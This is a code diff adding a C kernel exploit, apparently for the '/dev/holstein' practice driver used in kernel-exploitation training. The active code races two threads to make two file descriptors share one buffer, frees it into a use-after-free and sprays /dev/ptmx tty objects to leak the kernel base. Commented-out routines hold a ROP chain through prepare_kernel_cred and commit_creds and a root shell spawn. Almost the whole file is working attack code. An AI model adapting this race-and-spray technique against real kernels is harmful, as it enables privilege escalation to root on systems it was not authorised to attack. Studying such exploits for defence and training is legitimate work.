@@ -1,0 +1,246 @@
+#define _GNU_SOURCE
+#include <fcntl.h>
+#include <pthread.h>
+#include <sched.h>
+#include <stdarg.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/syscall.h>
+#include <unistd.h>
+
+#define debug(msg, ...)                                                        \
+    {                                                                          \
+        if (DEBUG_FLAG) {                                                      \
+            fprintf(stderr, "[D] " msg "\n", ##__VA_ARGS__);                   \
+        }                                                                      \
+    }
+#define info_prefix        "[*] "
+#define info(msg, ...)     printf(info_prefix msg "\n", ##__VA_ARGS__);
+#define progress(msg, ...) printf("[+] " msg "\r", ##__VA_ARGS__);
+#define fatal(msg, ...)                                                        \
+    {                                                                          \
+        printf("[!] " msg "\n", ##__VA_ARGS__);                                \
+        exit(EXIT_FAILURE);                                                    \
+    }
+#define pause()                                                                \
+    {                                                                          \
+        printf(info_prefix "Press ENTER to continue");                         \
+        getchar();                                                             \
+    }
+#define var(var)     printf(info_prefix #var " = 0x%016llx\n", var);
+#define rebase(addr) (addr - RAW_KBASE + kbase)
+
+#define DEVICE_NAME "/dev/holstein"
+#define RAW_KBASE   0xffffffff81000000
+
+#define mov_rdi_rax rebase(0xffffffff8165094b)
+
+typedef unsigned long long u64;
+typedef unsigned int       u32;
+typedef unsigned char      u8;
+
+u8 DEBUG_FLAG = 0;
+
+int  fd1, fd2;
+char buf[0x400];
+u64  g_buf_addr;
+
+u64 user_cs, user_rflags, user_sp, user_ss;
+u64 cookie, kbase, offset;
+u64 tmp_buf, cred_struct;
+
+enum current_state {
+    create_cred_struct_state,
+    spawn_shell_state,
+} global_cstate = create_cred_struct_state;
+
+/* void spawn_shell(void) { */
+/*     uid_t uid = geteuid(); */
+/*     if (uid > 0) { */
+/*         fatal("Failed to get root uid, current uid = %d", uid); */
+/*     } */
+/*     info("Spawning shell as root uid"); */
+/*     system("/bin/sh"); */
+/* } */
+
+/* void safe_exit(void); */
+
+/* void privesc(void) { */
+/*     size_t payload[0x200 / 8]; */
+/*     size_t cookie_idx = 0x80 / 8; */
+
+/*     payload[cookie_idx++] = cookie; */
+/*     payload[cookie_idx++] = 0; // rbx */
+
+/*     if (global_cstate == create_cred_struct_state) { */
+/*         payload[cookie_idx++] = pop_rdi; // saved rip */
+/*         payload[cookie_idx++] = 0; */
+/*         payload[cookie_idx++] = prepare_kernel_cred; */
+/*     } else if (global_cstate == spawn_shell_state) { */
+/*         payload[cookie_idx++] = pop_rdi; // saved_rip */
+/*         payload[cookie_idx++] = cred_struct; */
+/*         payload[cookie_idx++] = commit_creds; */
+/*     } */
+/*     payload[cookie_idx++] = kpti_trampoline + 22; */
+/*     payload[cookie_idx++] = 0; */
+/*     payload[cookie_idx++] = 0; */
+/*     payload[cookie_idx++] = (size_t)safe_exit; */
+/*     payload[cookie_idx++] = user_cs; */
+/*     payload[cookie_idx++] = user_rflags; */
+/*     payload[cookie_idx++] = user_sp; */
+/*     payload[cookie_idx++] = user_ss; */
+
+/*     info("Sending payload"); */
+/*     _write(payload, sizeof(payload)); */
+/* } */
+
+/* void safe_exit(void) { */
+/*     __asm__(".intel_syntax noprefix;" */
+/*             "mov tmp_buf, rax;" */
+/*             ".att_syntax noprefix;"); */
+/*     if (global_cstate == create_cred_struct_state) { */
+/*         cred_struct = tmp_buf; */
+/*         debug("cred_struct @ 0x%llx", cred_struct); */
+/*         global_cstate = spawn_shell_state; */
+/*         privesc(); */
+/*         return; */
+/*     } */
+/*     spawn_shell(); */
+/* } */
+
+void save_user_state(void) {
+    __asm__(".intel_syntax noprefix;"
+            "mov user_cs, cs;"
+            "mov user_sp, rsp;"
+            "mov user_ss, ss;"
+            "pushf;"
+            "pop user_rflags;"
+            ".att_syntax;");
+    debug("User state saved");
+}
+
+u8 race_win = 0;
+
+/* gettid() is not available on musl-gcc */
+pid_t _gettid(void) {
+    return syscall(SYS_gettid);
+}
+
+void *race(void *arg) {
+    cpu_set_t *cpu_set = (cpu_set_t *)arg;
+    if (sched_setaffinity(_gettid(), sizeof(cpu_set_t), cpu_set))
+        fatal("sched_setaffinity");
+    while (1) {
+        while (!race_win) {
+            int fd = open(DEVICE_NAME, O_RDWR);
+            if (fd == fd2) race_win = 1;
+            if (!race_win && fd != -1) close(fd);
+        }
+        if (write(fd1, "A", 1) != 1 || write(fd2, "A", 1) != 1) {
+            close(fd1);
+            close(fd2);
+            race_win = 0;
+        } else {
+            break;
+        }
+        /* usleep(1000); */
+    }
+    return NULL;
+}
+
+void *spray_thread(void *arg) {
+    cpu_set_t *cpu_set = (cpu_set_t *)arg;
+    if (sched_setaffinity(_gettid(), sizeof(cpu_set_t), cpu_set))
+        fatal("sched_setaffinity");
+
+    u64 x;
+    u64 spray[512];
+
+    for (u64 i = 0; i < 512; i++) {
+        /* usleep(10); */
+        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
+        if (spray[i] < 0) {
+            for (u64 j = 0; j < i; j++) close(spray[j]);
+            return (void *)-1;
+        }
+        if (read(fd2, &x, sizeof(u64)) == sizeof(u64) && x) {
+            for (u64 j = 0; j < i; j++) close(spray[j]);
+            return (void *)spray[i];
+        }
+    }
+    for (u64 i = 0; i < 512; i++) close(spray[i]);
+    return (void *)-1;
+}
+
+int create_overlap() {
+    pthread_t th1, th2;
+
+    char buf[0x10] = {0};
+
+    cpu_set_t t1_cpu, t2_cpu;
+    CPU_ZERO(&t1_cpu);
+    CPU_ZERO(&t2_cpu);
+    CPU_SET(0, &t1_cpu);
+    CPU_SET(1, &t2_cpu);
+
+    fd1 = open("/tmp", O_RDONLY);
+    fd2 = open("/tmp", O_RDONLY);
+    close(fd1);
+    close(fd2);
+    info("next fds: %d, %d", fd1, fd2);
+
+    pthread_create(&th1, NULL, race, (void *)&t1_cpu);
+    pthread_create(&th2, NULL, race, (void *)&t2_cpu);
+    pthread_join(th1, NULL);
+    pthread_join(th2, NULL);
+
+    char check[] = "Hello, World!";
+    write(fd1, check, sizeof(check));
+    read(fd2, buf, sizeof(check));
+    if (strcmp(buf, check) != 0) {
+        fatal("Unluck");
+    }
+    info("won the race");
+    memset(buf, 0, sizeof(check));
+    write(fd1, buf, sizeof(buf));
+
+    /* UAF */
+    close(fd1);
+
+    long victim_fd = -1;
+    victim_fd = (long)spray_thread(&t1_cpu);
+    while (victim_fd == -1) {
+        info("spraying on another CPU...");
+        pthread_create(&th1, NULL, spray_thread, (void *)&t2_cpu);
+        pthread_join(th1, (void *)&victim_fd);
+    }
+    info("overlap OK: victim_fd = %ld", victim_fd);
+
+    return victim_fd;
+}
+
+int main(int argc, char *argv[]) {
+    for (size_t i = 0; i < argc; i++) {
+        if (strcmp(argv[i], "DEBUG") == 0) {
+            DEBUG_FLAG = 1;
+            break;
+        }
+    }
+    setbuf(stdin, 0);
+    setbuf(stdout, 0);
+    setbuf(stderr, 0);
+    save_user_state();
+
+    create_overlap();
+    pause();
+    read(fd2, buf, sizeof(buf));
+
+    kbase = *(u64 *)&buf[0x18] - 0;
+    var(kbase);
+    g_buf_addr = *(u64 *)&buf[0x38] - 0x38;
+    var(g_buf_addr);
+
+    return 0;
+}
